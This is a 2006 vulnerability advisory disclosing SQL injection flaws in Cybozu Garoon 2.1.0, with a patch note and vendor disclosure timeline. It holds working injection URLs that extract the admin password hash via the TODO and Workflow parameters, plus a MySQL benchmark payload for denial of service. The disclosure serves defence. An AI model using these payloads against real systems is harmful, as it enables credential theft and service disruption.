@@ -1,0 +1,114 @@
+Cybozu Garoon 2 SQL Injection Vulnerabilities
+
+by Tan Chew Keong
+Release Date: 2006-08-28
+
+Summary
+
+Some SQL injection vulnerabilities have been found in Cybozu Garoon 2. When exploited by a logon user, 
+the vulnerabilities allow manipulation of SQL statements which can lead to disclosure of information 
+from the database, or to cause the backend MySQL database to consume large amount of CPU resources.
+
+Tested Versions
+
+Cybuzu Garoon 2 Version 2.1.0 for Windows
+
+Details
+
+This advisory discloses several SQL injection vulnerabilities in Cybozu Garoon 2.
+1) TODO List View/Modify SQL Injection Cybuzu Garoon 2 does not properly sanitise the "tid" parameter 
+in the TODO List View and Modify functionality. It is possible for a logon user to exploit this vulnerability 
+to select values from arbitrary tables in the database.  
+
+When logon as a normal user:
+TESTING NOTE a - In order for the examples to work, you must first logon as a user, then click on the TODO List link (icon) to go to the TODO List index page, before using the exploit.
+TESTING NOTE b - Example 2 requires that at least 1 TODO List category has been created (category value 1).
+
+
+Example 1:
+
+To retrieve the admin user's password hash via TODO List View.
+
+http://192.168.1.64/scripts/cbgrn/grn.exe/todo/view?tid=9999999)+union+select+1,null,col_foreign_key,col_password,2,null,0,null,null,null,null+from+tab_cb_user+where+_id=1/*&cid=
+
+Example 2:
+
+To retrieve the admin user's password hash via TODO List Modify.
+
+http://192.168.1.64/scripts/cbgrn/grn.exe/todo/modify?tid=9999999)+union+select+1,null,col_foreign_key,col_password,1,null,0,null,null,null,null+from+tab_cb_user+where+_id=1/*&cid=
+
+
+2) Workflow View/Print SQL Injection
+
+Cybuzu Garoon 2 does not properly sanitise the "pid" parameter in the Workflow View and Print functionality. 
+It is possible for a logon user to exploit this vulnerability to select values from arbitrary tables in the database.
+
+Example 1:
+
+To retrieve the admin user's password hash via Workflow View.
+
+http://192.168.1.64/scripts/cbgrn/grn.exe/workflow/view?fid=9&pid=8888888+union+select+1,2,3,4,5,6,7,8,9,10,11,12,col_foreign_key,14,col_password,16,17,18,19,20,21,22+from+tab_cb_user where _id=1/*
+
+Example 2:
+
+To retrieve the admin user's password hash via Workflow Print.
+
+http://192.168.1.64/scripts/cbgrn/grn.exe/workflow/print?fid=9&pid=7777777+union+select+col_password,2,3,4,col_foreign_key,6,7,8,9,10,11,12,13,14,15,16,17,18+from+tab_cb_user where _id=1/*
+
+Note: In order for example 2 to work, "fid" must be a valid folder ID.
+
+3) Other SQL Injection Vulnerabilities
+
+Several other SQL injection vulnerabilities exists. These may e.g. be exploited to cause the MySQL-based Cybozu Database Engine to consume large amount of CPU resources, potentially causing a DoS.
+
+SQL Injection:
+
+http://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid=[SQL]
+http://192.168.1.64/scripts/cbgrn/grn.exe/todo/delete?tid=[SQL]
+http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/user_view?uid=1[SQL]
+http://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/add?gid=1&uid=1[SQL]
+http://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/history?gid=1&uid=1[SQL]
+http://192.168.1.64/scripts/cbgrn/grn.exe/memo/view?iid=1[SQL]&did=
+http://192.168.1.64/scripts/cbgrn/grn.exe/memo/print?iid=1[SQL]&did=
+http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1[SQL]
+http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1&uid=1[SQL]
+
+Test Samples:
+
+http://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid='
+http://192.168.1.64/scripts/cbgrn/grn.exe/todo/delete?tid='
+http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/user_view?uid=1'
+http://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/add?gid=1&uid=1'
+http://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/history?gid=1&uid=1'
+http://192.168.1.64/scripts/cbgrn/grn.exe/memo/view?iid=1'&did=
+http://192.168.1.64/scripts/cbgrn/grn.exe/memo/print?iid=1'&did=
+http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1'
+http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1&uid=1'
+
+Example Exploit Against MySQL Backend:
+
+http://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid=9999999)+ORDER+BY+_id,rand(benchmark(1000000000000,sha1(123456781234567812345678)))/*
+
+Patch / Workaround
+
+Update to version 2.1.1.
+
+References
+
+http://cybozu.co.jp/products/dl/notice_060825/
+
+Disclosure Timeline
+
+2006-07-04 - Vulnerability Discovered.
+2006-07-13 - Initial Vendor Notification.
+2006-07-13 - Initial Vendor Reply.
+2006-07-14 - Received scheduled patch release date from vendor.
+2006-08-16 - Received notification that patch release will be delayed.
+2006-08-25 - Vendor released patch information on website.
+2006-08-28 - Public Disclosure.
+
+Contact
+For further enquries, comments, suggestions or bug reports, simply email them to 
+Tan Chew Keong (chewkeong[at]vuln[dot]sg)
+
+# milw0rm.com [2006-08-28]
